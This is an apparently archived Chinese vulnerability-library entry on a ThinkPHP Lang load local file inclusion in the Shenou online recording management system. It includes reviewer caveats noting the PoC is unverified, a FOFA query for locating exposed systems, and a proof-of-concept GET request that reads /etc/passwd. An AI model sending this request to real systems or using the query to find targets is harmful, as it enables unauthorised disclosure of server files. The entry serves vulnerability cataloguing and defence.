---
source: "wy876 漏洞文库"
title: "申瓯在线录音管理系统/ThinkPHP Lang load本地文件包含"
product: "申瓯在线录音管理系统/ThinkPHP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "组件与产品版本未知，Linux示例"
prerequisites: "无Cookie请求，权限未证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zdcq09yhyllgqpdn"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%94%B3%E7%93%AF%E9%80%9A%E4%BF%A1%E8%AE%BE%E5%A4%87%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E5%9C%A8%E7%BA%BF%E5%BD%95%E9%9F%B3%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Findex%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"在线录音管理系统\""
id: "vw-bad281ffc7f36fac3a38be30"
entity_id: "ve-bad281ffc7f36fac3a38be30"
schema_version: "1"
previous_fofa_unverified: "title="
---

# 申瓯在线录音管理系统/ThinkPHP Lang load本地文件包含

> 指纹历史字段校订（2026-10-04）：现有完整平台查询保持原值；旧未核字段中的残片逐字迁入 `previous_*`。此迁移不代表已确定原文其他谓词的组合意图，未给出的 AND/OR 不猜补。后文残片字段的旧诊断描述校订前状态，查询仍不证明资产受影响。

## 条目说明

- 对象与具体问题：申瓯在线录音管理系统/ThinkPHP；Lang load本地文件包含
- 版本、配置及部署条件：组件与产品版本未知，Linux示例
- 认证与权限前提：无Cookie请求，权限未证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA末尾空font标签污染，简介全面企业管理软件不符合录音产品用途，疑模板泛写
- HTTP错标Java，无响应/源码/补丁

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
申瓯通信设备有限公司在线录音管理系统系统是一款全面的企业管理软件，涵盖多个领域，助力企业实现信息化管理和业务优化。申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞。

## 二、影响版本
+ 在线录音管理系统

## 三、资产测绘
+ fofa`title="在线录音管理系统"`


## 四、漏洞复现
```http
GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/etc/passwd HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zdcq09yhyllgqpdn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
